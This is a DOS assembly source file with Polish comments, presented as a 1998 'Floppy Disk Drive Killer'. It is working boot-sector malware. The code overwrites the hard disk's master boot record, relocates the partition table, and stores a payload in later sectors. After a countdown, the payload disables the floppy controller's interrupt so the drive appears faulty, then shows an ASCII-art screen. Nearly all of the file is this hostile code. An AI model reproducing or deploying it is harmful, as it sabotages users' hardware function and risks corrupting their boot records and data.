;Program (FDDKILL.ASM) napisany przez M$(1998).
;Opis:
; Program ten instaluje dwie procedury:
;  - FloppyKiller w 3 sektorze dysku twardego,
;  - Partition w 1 sektorze dysku twardego.
; Orginalna tablica partycji zostaje przeniesiona do 2 sektora dysku twardrgo.
; Procedura Partition wczytuje i uruchamia procedure FloppyKiller. Procedura FloppyKiller
; posiada licznik. Jezeli osiagnie on wartosc 10 to zostaje wylaczone sprzetowe przerwanie IRQ #6.
; Powoduje to ze stacja dyskietek zachowuje sie jak uszkodzona.
; Nawet Windows 95 daje sie na to zlapac...

.Model Tiny
.Data
.286
 Bufor db 512 dup (0)
 Uni db 'UnInstalled succefully.',13,10,'$'
 Msg db 'installed succefully.',13,10,'$'
 Ero db '(Un)Install error.',13,10,'$'
 Inf db 10,10,'FLOPPY DISK DRIVE KILLER by MS(1998)...','$'

 Licznik = 1     ; za ktorym razem ma zostac uaktywniona procedura FDDKill

.Code
 Org 100h
 jumps

 Begin:
  jmp Check       ; skok do poczatku programu

  Partition:      ; Procedura Partition
   xor ax,ax
   mov ss,ax
   mov sp,7c00h   ; stos jest ustawiany tak jak w orginale
   mov ax,9000h
   mov es,ax      ; es:bx = [9000:0000] - adres pod ktory zostanie wczytana procedura FloppyKiller
   xor bx,bx
   mov ax,0202h
   mov cx,0003h   ; 3,4 sektor
   mov dx,0080h
   push es        ; adres es:bx na stos
   push bx
   int 13h        ; odczyt sektora 3,4
   retf           ; uruchomienie procedury FlopyKiller...
   Pointer db 'FDDK by OverCool',0  ; Znacznik

  FloppyKillerCode:  ; Procedura FlopyKiller

   jmp Compare

   Chr  DB 176,177,178,219,220,223,96,126,32
 
   Pic  DB 9Eh,53h,43h,33h,23h,13h,9Fh,95h,81h,95h,52h,0FFh,9Bh,52h,42h
        DB 33h,23h,13h,9Fh,9Ah,81h,93h,51h,61h,92h,41h,91h,51h,92h,41h
        DB 92h,52h,92h,41h,51h,62h,0FFh,99h,51h,41h,32h,22h,12h,9Fh,9Fh
        DB 92h,81h,94h,41h,92h,41h,91h,41h,92h,41h,91h,41h,52h,41h,91h
        DB 41h,0FFh,97h,51h,41h,31h,21h,11h,9Fh,9Ah,53h,99h,81h,95h,62h
        DB 93h,61h,51h,41h,91h,61h,52h,92h,61h,0FFh,96h,41h,31h,21h,11h
        DB 9Fh,9Dh,62h,42h,51h,96h,81h,95h,52h,9Bh,41h,0FFh,94h,51h,49h
        DB 53h,9Dh,53h,48h,31h,21h,11h,95h,81h,93h,51h,61h,94h,52h,92h
        DB 51h,62h,51h,91h,41h,0FFh,93h,51h,42h,62h,96h,63h,43h,53h,91h
        DB 53h,43h,64h,95h,62h,41h,31h,21h,11h,94h,81h,93h,41h,94h,41h
        DB 92h,41h,91h,41h,92h,41h,91h,41h,51h,0FFh,92h,43h,9Fh,63h,41h
        DB 63h,9Fh,41h,31h,21h,11h,93h,81h,94h,63h,91h,61h,52h,61h,92h
        DB 62h,0FFh,93h,43h,51h,99h,53h,61h,42h,61h,51h,61h,41h,31h,61h
        DB 54h,98h,51h,42h,21h,11h,94h,81h,0FFh,93h,49h,32h,22h,12h,94h
        DB 51h,41h,51h,92h,31h,21h,11h,4Ch,31h,21h,11h,94h,81h,9Dh,51h
        DB 0FFh,93h,44h,32h,22h,12h,92h,52h,44h,31h,21h,91h,42h,31h,21h
        DB 11h,93h,63h,47h,31h,21h,11h,94h,81h,9Ch,41h,91h,41h,93h,52h
        DB 0FFh,93h,41h,31h,21h,12h,95h,51h,47h,31h,21h,91h,42h,32h,22h
        DB 11h,92h,11h,94h,62h,41h,31h,21h,11h,95h,81h,94h,41h,94h,41h
        DB 91h,41h,52h,41h,92h,41h,0FFh,94h,61h,93h,12h,91h,51h,48h,31h
        DB 21h,92h,61h,91h,41h,32h,22h,11h,94h,13h,91h,31h,11h,97h,81h
        DB 94h,41h,91h,41h,91h,41h,92h,61h,93h,41h,92h,63h,51h,0FFh,9Ah
        DB 51h,42h,63h,53h,92h,62h,91h,41h,61h,51h,91h,53h,93h,11h,92h
        DB 11h,9Bh,81h,95h,61h,91h,61h,9Ah,63h,0FFh,9Ah,52h,91h,41h,61h
        DB 92h,21h,93h,61h,96h,61h,21h,92h,41h,61h,91h,52h,94h,81h,92h
        DB 41h,93h,41h,92h,51h,63h,92h,41h,62h,51h,92h,53h,0FFh,9Bh,21h
        DB 95h,61h,9Bh,61h,96h,21h,94h,81h,93h,41h,52h,41h,92h,41h,52h
        DB 93h,41h,61h,41h,93h,41h,51h,0FFh,9Bh,61h,9Fh,99h,61h,94h,81h
        DB 93h,41h,93h,41h,92h,41h,94h,61h,51h,91h,61h,51h,91h,41h,53h
        DB 92h,51h,91h,51h,91h,61h,0FFh,9Fh,9Fh,9Bh,81h,9Bh,63h,0FFh,71h
        DB 96h,41h,0FFh,71h,92h,41h,92h,61h,9Fh,93h,41h,64h,91h,41h,62h
        DB 51h,92h,41h,61h,51h,95h,41h,92h,51h,91h,61h,96h,51h,9Fh,93h
        DB 53h,0FFh,71h,92h,41h,97h,51h,61h,41h,51h,61h,41h,98h,41h,53h
        DB 92h,41h,93h,41h,91h,41h,92h,41h,94h,41h,51h,61h,92h,41h,92h
        DB 41h,93h,41h,93h,41h,62h,93h,41h,62h,51h,95h,42h,0FFh,71h,93h
        DB 41h,95h,41h,92h,61h,93h,41h,97h,41h,95h,41h,93h,41h,91h,41h
        DB 52h,61h,94h,41h,91h,41h,93h,41h,92h,41h,52h,91h,41h,52h,91h
        DB 41h,62h,92h,41h,61h,41h,61h,95h,41h,0FFh,71h,94h,41h,9Fh,94h
        DB 61h,95h,64h,9Fh,9Dh,63h,94h,61h,94h,52h
     EndPic:

   posx db 0
   posy db 0
   attr db 01h

   Compare:
   cmp byte ptr cs:[Check-FloppyKillerCode-1],0 ; sprawdzenie licznika
   jz KillFDD
   sub byte ptr cs:[Check-FloppyKillerCode-1],1  ; zwiekszenie go o 1

   mov ax,9000h
   mov es,ax
   mov ax,0302h
   mov cx,0003h
   mov dx,0080h
   mov bx,0000h
   int 13h         ; zapisanie calej procedury z zwiekszonym licznikem
   jmp LoadOldPart ; skok do procedury ladujacej orginalny boot rekord

  KillFDD:         ; procedura wylaczajaca IRQ #6 - przerwanie sprzetowe FDD
   mov dx,21h
   in al,dx        ; al - zawartosc portu 21h
   or al,40h       ; wyzerowanie 6 bitu
   out dx,al       ; i z powrotem do portu 21h

  mov ax,0003h
  int 10h
  mov dx,3D4h      ; wylaczenie kursora tekstowego
  mov ax,100Ah     ; (przez porty)
  out dx,ax
  push 0b800h
  pop es
  mov si,offset (Pic-FloppyKillerCode)  ; si = wskaznik do danych
  mov cx,(EndPic-Pic)

 AllDraw:
  mov al,byte ptr cs:[si]         ; al - licznik
  cmp al,0ffh
  jnz Continue
  inc byte ptr cs:[posy-FloppyKillerCode]        ; posy
  mov byte ptr cs:[posx-FloppyKillerCode],0      ; posx
  inc si                                           
  mov byte ptr cs:[attr-FloppyKillerCode],01h
  loop AllDraw

 continue:
  mov ah,al                       ; ah - znak
  and al,0fh
  push cx
  xor ch,ch
  mov cl,al
  shr ah,4
  mov al,ah
  xor ah,ah
 
  mov di,(Chr-FloppyKillerCode-1) ;(offset chr)-1
  add di,ax
  mov dl,byte ptr cs:[di]      ; dl-znak  cl-licznik

  cmp dl,126     ; czy zmienic atrybut
  jnz next
  mov byte ptr cs:[attr-FloppyKillerCode],04h  ;  attr,04h
  Back:
  inc si
  pop cx
  loop AllDraw

  next:
  cmp dl,96       ; czy zmienic atrybut
  jnz Forward
  mov byte ptr cs:[attr-FloppyKillerCode],0eh  ;  mov attr,0eh
  jmp back

  Forward:
   
  mov al, byte ptr cs:[posx-FloppyKillerCode]
  mov bl, byte ptr cs:[posy-FloppyKillerCode]

                          ; wypisanie znaku  ax = x  bx = y
 Draw:
  push ax
  push bx
  mov di,bx               ; obliczenie ofsetu pamieci ekranu
  shl bx,7                ; wg wzoru:
  shl di,5                ;           Ofs = Y * 160 + X * 2
  add bx,di               ; dodawanie...
  shl ax,1                ; ... i przesuniecia bitowe sa szybsze
  add ax,bx
  mov di,ax
  mov byte ptr es:[di],dl    ; wypisz znak
  mov dh,byte ptr cs:[attr-FloppyKillerCode]
  mov byte ptr es:[di+1],dh  ; postaw atrybut
  pop bx                       ; przywroc rejsetry
  pop ax
  inc al                       ; zwieksz x
  inc byte ptr cs:[posx-FloppyKillerCode]
  loop Draw                    ; i powtorz
  pop cx
  inc si
  loop alldraw
  xor ax,ax
  int 16h


  LoadOldPart:     ; ladowanie orginalnego Boot Rekordu
   xor ax,ax
   mov es,ax
   mov ax,0201h
   mov cx,0002h
   mov dx,0080h
   mov bx,7c00h
   push es
   push bx
   int 13h       ; zaladowanie go pod adres 0000:7c00h
   retf          ; i uruchomienie go...
   counter db Licznik  ; liczink
  FloppyKillerEndOfCode:

  Check:
   mov ah,09h
   lea dx,Inf
   int 21h             ; informacja
   mov ax,0201h
   mov cx,0001h
   mov dx,0080h
   mov bx,Offset Bufor
   int 13h             ; odczyt tablicy partycji do bufora

   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,Offset Partition
   mov di,Offset Bufor
   cld
   rep cmpsb                            ; sprawdzenie czy jest juz zainstalowany
   jne Install                          ; jezeli nie to instaluj

  UnInstall:                            ; Deinstalacja programu
   mov ax,0201h
   mov cx,0002h
   mov dx,0080h
   mov bx,Offset Bufor
   int 13h                              ; Odczyt 2 sektora (orginalna tablica partycji)
   mov ax,0301h
   mov cl,1h
   int 13h                              ; przepisanie jej do 1 sektora
   mov di,offset Bufor
   mov cx,256
   xor ax,ax
   cld
   rep stosw                            ; wyczyszczenie bufora
   mov ax,0301h
   mov cx,0002h
   int 13h                              ; wyczyszczenie zainfekowanych sektorow

   mov ax,0301h
   mov cx,0003h
   int 13h                              ; wyczyszczenie zainfekowanych sektorow

   mov ax,0301h
   inc cx
   int 13h
   mov ah,09h
   lea dx,Uni
   int 21h        ; informacja o deinstalacji
   ret            ; zakonczenie programu

  Install:        ; czesc instalacyjna programu
   mov ax,0301h
   mov cl,2h
   int 13h        ; Przesuniecie orinalnej tablicy partycji do 2 sektora
   jc Error
   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,offset Partition
   mov di,offset Bufor
   cld
   rep movsb      ; zmiana kodu boot-rekordu

   mov ax,0301h
   mov cx,0001h
   int 13h        ; Zapis tablicy partycji z nowym boot-rekordem do 1 sektora
   jc Error

   mov di,offset Bufor         ; wyczyszczenie bufora
   mov cx,256
   xor ax,ax
   cld
   rep stosw


   mov cx,(FloppyKillerEndOfCode-FloppyKillerCode) ; cx = dlugosc procedury FloppyKiller

   mov bx,offset FloppyKillerCode
   mov ax,0302h
   mov cx,0003h
   int 13h      ; zapis procedury FloppyKiller do 3,4 sektora
   jc Error

   mov ah,09h
   lea dx,Msg
   int 21h      ; informacja o poprawnym zainstalowaniu
   ret          ; zakonczenie dzialania programu

  Error:
   mov ah,09h
   lea dx,Ero
   int 21h      ; informacja: wystapil blad w czasie instalacji
   ret          ; zakonczenie dzialania programu

  End Begin






